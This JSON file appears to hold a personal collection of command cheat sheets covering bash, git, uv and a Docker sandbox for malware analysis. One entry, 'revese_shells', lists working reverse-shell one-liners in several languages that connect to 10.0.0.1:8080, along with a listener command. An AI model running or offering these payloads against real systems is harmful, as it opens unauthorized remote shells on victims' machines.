{
  "cheatsheets": [
    {
      "name": "bash_commands",
      "content": "# Bash Common Commands Cheat Sheet\n## path\n/Users/jeppe/csnew/sample_data/bash_commands/commo_commands.md\n## Navigation\n\n```bash\npwd               # Print working directory\nls                # List files in directory\nls -la            # List all files (including hidden) in detail\ncd [directory]    # Change directory\ncd ..             # Go up one directory\ncd ~              # Go to home directory\n```\n\n## File Operations\n\n```bash\ntouch [file]      # Create a new file\ncp [src] [dest]   # Copy file\nmv [src] [dest]   # Move/rename file\nrm [file]         # Remove file\nrm -r [directory] # Remove directory recursively\nmkdir [directory] # Create a new directory\nrmdir [directory] # Remove an empty directory\n```\n\n## File Viewing\n\n```bash\ncat [file]        # Display entire file content\nless [file]       # View file with paging\nhead [file]       # Show first 10 lines\nhead -n 20 [file] # Show first 20 lines\ntail [file]       # Show last 10 lines\ntail -f [file]    # Follow file changes in real-time\n```\n\n## Search\n\n```bash\ngrep [pattern] [file]         # Search for pattern in file\ngrep -r [pattern] [directory] # Search recursively through directory\nfind [dir] -name \"pattern\"    # Find files matching pattern\n```\n\n## Permissions\n\n```bash\nchmod [permissions] [file]    # Change file permissions\nchmod +x [file]               # Make file executable\nchown [user]:[group] [file]   # Change file owner\n```\n\n## Process Management\n\n```bash\nps                # List running processes\nps aux            # List all running processes in detail\nkill [pid]        # Kill process with specified PID\nkillall [process] # Kill all processes with specified name\ntop               # Display active processes in real-time\nhtop              # Interactive process viewer (if installed)\n```\n\n## Compression\n\n```bash\ntar -czvf [archive.tar.gz] [directory/] # Create compressed archive\ntar -xzvf [archive.tar.gz]              # Extract compressed archive\nzip -r [archive.zip] [directory/]       # Create zip archive\nunzip [archive.zip]                     # Extract zip archive\n```\n\n## System Info\n\n```bash\ndf -h             # Disk space usage (human-readable)\ndu -sh [directory] # Directory size (human-readable)\nfree -m           # Memory usage in MB\nuname -a          # System information\n```\n\n## Networking\n\n```bash\nping [host]       # ICMP ping host\ncurl [url]        # Fetch URL content\nwget [url]        # Download file from URL\nssh [user]@[host] # Connect to host via SSH\nnetstat -an       # Show all network connections\n```\n\n## Redirection and Pipes\n\n```bash\ncommand > file    # Redirect output to file (overwrite)\ncommand >> file   # Redirect output to file (append)\ncommand < file    # Take input from file\ncommand1 | command2 # Pipe output of command1 to command2\ncommand &         # Run command in background\n```\n",
      "categories": [
        "bash",
        "terminal"
      ],
      "description": "",
      "created_at": "2025-03-02T19:09:41.447190",
      "updated_at": "2025-03-02T19:09:41.447190"
    },
    {
      "name": "revese_shells",
      "content": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Reverse Shell One-Liners</title>\n    <style>\n        body {\n            font-family: 'Courier New', monospace;\n            max-width: 900px;\n            margin: 0 auto;\n            padding: 20px;\n            line-height: 1.5;\n        }\n        h1 {\n            color: #d70000;\n            text-align: center;\n        }\n        h2 {\n            color: #333;\n            border-bottom: 1px solid #ccc;\n            padding-bottom: 5px;\n        }\n        pre {\n            background-color: #f5f5f5;\n            border: 1px solid #ddd;\n            border-radius: 4px;\n            padding: 10px;\n            overflow-x: auto;\n        }\n        .note {\n            background-color: #ffffd7;\n            border-left: 4px solid #ffd700;\n            padding: 10px;\n            margin: 10px 0;\n        }\n        .warning {\n            background-color: #ffdddd;\n            border-left: 4px solid #f44336;\n            padding: 10px;\n            margin: 10px 0;\n        }\n    </style>\n</head>\n<body>\n    <h1>Reverse Shell One-Liners</h1>\n    \n    <div class=\"warning\">\n        <strong>Warning:</strong> These are for educational purposes and authorized penetration testing only. \n        Unauthorized use against systems you don't own is illegal.\n    </div>\n    \n    <h2>Bash</h2>\n    <pre>bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</pre>\n    \n    <h2>Python</h2>\n    <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</pre>\n    \n    <h2>Python3</h2>\n    <pre>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</pre>\n    \n    <h2>PHP</h2>\n    <pre>php -r '$sock=fsockopen(\"10.0.0.1\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");'</pre>\n    \n    <h2>Netcat</h2>\n    <pre>nc -e /bin/sh 10.0.0.1 8080</pre>\n    <div class=\"note\">\n        <strong>Note:</strong> The -e option is not available in all versions of netcat. Alternative:\n    </div>\n    <pre>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f</pre>\n    \n    <h2>Perl</h2>\n    <pre>perl -e 'use Socket;$i=\"10.0.0.1\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'</pre>\n    \n    <h2>Ruby</h2>\n    <pre>ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",8080).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'</pre>\n    \n    <h2>PowerShell</h2>\n    <pre>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>\n    \n    <h2>Java</h2>\n    <pre>r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()</pre>\n\n    <h2>Setting Up a Listener</h2>\n    <p>On the attacker machine, set up a listener to receive the connection:</p>\n    <pre>nc -lvnp 8080</pre>\n    \n    <div class=\"note\">\n        <strong>Remember:</strong> Replace 10.0.0.1 with your IP address and 8080 with your chosen port number.\n    </div>\n</body>\n</html>\n",
      "categories": [
        "hacking",
        "exploits"
      ],
      "description": "Revesed shells oneliners",
      "created_at": "2025-03-02T19:23:33.446401",
      "updated_at": "2025-03-02T19:23:33.446401"
    },
    {
      "name": "git_commands",
      "content": "# Git Quick Reference\n\n## Basic Commands\n- git init - Initialize a new repository\n- git clone <url> - Clone a repository\n- git add <file> - Add file to staging\n- git commit -m \"message\" - Commit changes\n- git push - Push changes to remote\n- git pull - Pull changes from remote\n\n## Branching\n- git branch - List branches\n- git branch <name> - Create a branch\n- git checkout <branch> - Switch to branch\n- git merge <branch> - Merge branch into current branch\n",
      "categories": [
        "git",
        "version-control"
      ],
      "description": "Common Git commands",
      "created_at": "2025-03-02T19:30:14.760396",
      "updated_at": "2025-03-02T19:30:14.760396"
    },
    {
      "name": "uv",
      "content": "# UV Package Manager Cheat Sheet\n\n## Virtual Environment\n- `uv venv` - Create a new virtual environment in .venv\n- `uv venv --path /path/to/venv` - Create a new virtual environment at specified path\n- `source .venv/bin/activate` - Activate the virtual environment\n\n## Installing Packages\n- `uv pip install <package>` - Install a package\n- `uv pip install <package>==<version>` - Install a specific version\n- `uv pip install -r requirements.txt` - Install from requirements file\n- `uv pip install -e .` - Install current package in development mode\n\n## Managing Requirements\n- `uv pip freeze > requirements.txt` - Export installed packages to requirements.txt\n- `uv pip compile requirements.in` - Compile requirements.in to requirements.txt with resolved dependencies\n\n## Uninstalling\n- `uv pip uninstall <package>` - Uninstall a package\n- `uv pip uninstall -r requirements.txt` - Uninstall all packages in requirements.txt\n\n## Package Information\n- `uv pip show <package>` - Show information about an installed package\n- `uv pip list` - List installed packages\n- `uv pip list --outdated` - List outdated packages\n\n## Building\n- `uv pip wheel .` - Build a wheel for the current package\n- `uv pip wheel -r requirements.txt` - Build wheels for all packages in requirements.txt",
      "categories": [],
      "description": "",
      "created_at": "2025-03-03T01:06:23.828092",
      "updated_at": "2025-03-03T01:06:23.828092"
    },
    {
      "name": "docker_commands",
      "content": "Sure! Here\u2019s the Docker Cheat Sheet directly in the chat:\n\nDocker Cheat Sheet for Malware Analysis\n\nBasic Docker Commands\n\t\u2022\tCheck if Docker is running:\n\ndocker ps\n\n\n\t\u2022\tList all containers (including stopped ones):\n\ndocker ps -a\n\n\n\t\u2022\tStart a new container interactively:\n\ndocker run -it --name test_container ubuntu bash\n\n\n\t\u2022\tRestart a stopped container:\n\ndocker start -ai test_container\n\n\n\t\u2022\tStop a running container:\n\ndocker stop test_container\n\n\n\t\u2022\tRemove a container:\n\ndocker rm test_container\n\n\n\t\u2022\tList available images:\n\ndocker images\n\n\n\t\u2022\tRemove an image:\n\ndocker rmi ubuntu\n\nSecurity-focused Arguments for Malware Analysis\n\n1. Prevent Network Access\n\t\u2022\tRun a container without internet:\n\ndocker run -it --network none ubuntu bash\n\n\n\n2. Use a Read-Only Filesystem\n\t\u2022\tPrevent the container from writing to disk:\n\ndocker run -it --read-only ubuntu bash\n\n\n\n3. Drop All Privileges\n\t\u2022\tMinimize system capabilities to reduce risks:\n\ndocker run -it --cap-drop ALL ubuntu bash\n\n\n\n4. Restrict Root Privileges\n\t\u2022\tPrevent privilege escalation inside the container:\n\ndocker run -it --security-opt no-new-privileges ubuntu bash\n\n\n\n5. Use Temporary Filesystems\n\t\u2022\tEnsure temp directories are ephemeral (auto-cleaned on exit):\n\ndocker run -it --tmpfs /tmp --tmpfs /run --tmpfs /var/tmp ubuntu bash\n\n\n\n6. Combine All for Maximum Security\n\t\u2022\tBest practice setup for malware analysis sandbox:\n\ndocker run -it --rm \\\n  --name malware_sandbox \\\n  --network none \\\n  --read-only \\\n  --cap-drop ALL \\\n  --security-opt no-new-privileges \\\n  --tmpfs /tmp \\\n  --tmpfs /run \\\n  --tmpfs /var/tmp \\\n  ubuntu bash\n\nThis setup ensures minimal risk while analyzing unknown malware inside a container.\n\nLet me know if you need additional commands or modifications! \ud83d\ude80\n",
      "categories": [],
      "description": "",
      "created_at": "2025-03-03T22:23:37.130149",
      "updated_at": "2025-03-03T22:23:37.130149"
    }
  ]
}